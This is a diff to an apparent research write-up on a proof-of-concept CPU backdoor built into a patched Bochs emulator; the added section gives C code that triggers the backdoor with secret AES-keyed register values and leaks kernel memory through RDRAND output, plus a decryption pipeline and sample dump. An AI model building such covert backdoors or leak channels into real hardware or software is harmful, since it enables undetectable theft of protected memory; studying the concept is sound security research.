@@ -334,8 +334,113 @@ process. That way, no observation, in software *or* hardware, that does not
 involve analyzing the CPU die itself can reveal the presence of this type of
 backdoor.
 
-Note that anything that the CPU can access can be accessed by this form of
-backdoor -- there is no way to hide your information 
+Note that anything that the CPU can access has to be accessible by this type of
+backdoor -- there is no way to hide your information from this backdoor and
+still be able to process it with your CPU.
 
+
+KERNEL MEMORY DUMPING PoC
+
+Once we have patched Bochs, we can start up linux and run the following code
+to dump an arbitrary range of virtual memory:
+
+#include <openssl/aes.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdint.h>
+#include <stdio.h>
+
+struct ctrctx {
+    uint64_t counter;
+    uint8_t aeskey [16];
+};
+
+void poke() {
+    volatile uint64_t c,d;
+    c = 0xaaabadbadbadbeef;
+    d = 0xbeefbeefbeefbeef;
+    asm volatile("rdrand  %0\n\t"
+                 "rdrand  %1": "=r"(c), "=r"(d));
+    printf("%016lX", c);
+    printf("%016lX\n", d);
+}
+
+int main() {
+    volatile uint64_t rax;
+    volatile uint64_t rbx;
+    volatile uint64_t rcx;
+    volatile uint64_t rdx;
+    uint64_t base, len, i;
+
+    struct ctrctx ctx;
+    uint8_t buf [16];
+
+    base = 0xffffffff8105c7e0;
+    len = 1024;
+    ctx.counter = 0;
+    memcpy(ctx.aeskey, "YELLOW SUBMARINE", 16);
+
+    for (i = base; i < base + len; i++) {
+        ctr_output(buf, &ctx);
+
+        rax = 0x99a0086fba28dfd1;
+        rbx = 0xe2dd84b5c9688a03;
+        rcx = 0xabadbabe00000001;
+        rdx = i;
+
+        rax ^= *((uint64_t *) buf);
+        rbx ^= *((uint64_t *) buf + 1);
+        ctx.counter++;
+        ctr_output(buf, &ctx);
+        rcx ^= *((uint64_t *) buf);
+        rdx ^= *((uint64_t *) buf + 1);
+        ctx.counter++;
+
+        asm volatile("add %0, %1" : "=a" (rax) : "a" (rax), "b" (rbx), "c" (rcx), "d" (rdx): );
+
+        poke();
+    }
+}
+
+void ctr_output(uint8_t *output, struct ctrctx *ctx) {
+    uint8_t ibuf [16];
+
+    AES_KEY keyctx;
+    AES_set_encrypt_key(ctx->aeskey, 128, &keyctx);
+
+    memset(ibuf, 0xef, 16);
+    memcpy(ibuf, &(ctx->counter), 8);
+    AES_encrypt(ibuf, output, &keyctx);
+}
+
+
+if the output of the above code is in peek_output, running:
+for foo in `cat peek_output`; do echo -n $foo |xxd -r -p | ./qw |openssl enc -d -aes-128-ecb -nopad -K 59454c4c4f57205355424d4152494e45|xxd >> dump;done
+
+(./qw just endian-swaps all the bytes in each quadword because of how we
+copied data from the output buffer for AES into the registers)
+
+will generate a memory dump -- look at the last byte in each 16 byte block for
+the bytes of data. indeed, the first few lines of dump (which begins at 
+0xffffffff8105c7e0) are:
+0000000: db10 0000 0000 0000 fefe fefe fefe 00c0  ................
+0000000: dc10 0000 0000 0000 fefe fefe fefe 00be  ................
+0000000: dd10 0000 0000 0000 fefe fefe fefe 009f  ................
+0000000: de10 0000 0000 0000 fefe fefe fefe 0000  ................
+0000000: df10 0000 0000 0000 fefe fefe fefe 0000  ................
+0000000: e010 0000 0000 0000 fefe fefe fefe 0000  ................
+
+and if you look at the first few bytes starting at 0xffffffff8105c7e0 (this
+is in the text section of the kernel) (do ./extract-vmlinux on the vmlinuz file
+and objdump -d):
+
+ffffffff8105c7df:       75 c0
+ffffffff8105c7e1:       be 9f 00 00 00
+
+which matches.
+
+Note that throughout the execution of this program, all the register/memory
+state is *identical* whether or not you run it on a CPU that has this
+backdoor or not (except for RDRAND output, obviously).
 
 Full code is available at https://github.com/matildah/bochsdoor
